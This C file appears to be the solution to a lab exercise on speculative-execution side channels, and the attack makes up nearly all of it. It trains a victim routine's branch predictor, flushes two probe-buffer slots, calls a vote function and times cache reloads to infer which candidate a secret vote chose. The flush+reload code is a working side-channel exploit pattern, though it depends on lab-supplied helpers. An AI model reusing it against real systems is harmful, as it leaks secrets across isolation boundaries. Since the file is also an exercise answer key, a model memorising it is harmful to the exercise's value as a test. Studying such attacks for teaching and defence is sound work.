#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#include "cacheutils.h"
#include "common.h"

extern void run_victim(void);
extern uint8_t probe_buffer[];
extern int cast_vote(void);

#define REPEAT 1
#define TRAIN 10

int main(void) {

    /* BEGIN_SOLUTION */
    uint64_t times[2][REPEAT];

    for (int r = 0; r < REPEAT; r++) {

        // 1) Train victim to take authenticated path
        for(int i = 0; i < TRAIN; i++) {
            run_victim();
        }

        // 2) Flush both probe slots
        flush(&probe_buffer[IDX_A]);
        flush(&probe_buffer[IDX_B]);

        // 3) Flush authentication flag to force speculation
        //flush_auth();
        cast_vote();

        // 4) Reload both and record timings
        times[0][r] = reload(&probe_buffer[IDX_A]);
        times[1][r] = reload(&probe_buffer[IDX_B]);
    }

    // Compute medians
    uint64_t meda, medb ;
    compute_median(times[0], REPEAT, &meda);
    compute_median(times[1], REPEAT, &medb);

    printf("Median times: candidate a=%lu cycles, candidate b=%lu cycles\n", meda, medb);

    char guessed = (meda < medb) ? 'a' : 'b';
    printf("Guessed secret_candidate = %c\n", guessed);
    /* END_SOLUTION */

    return 0;
}
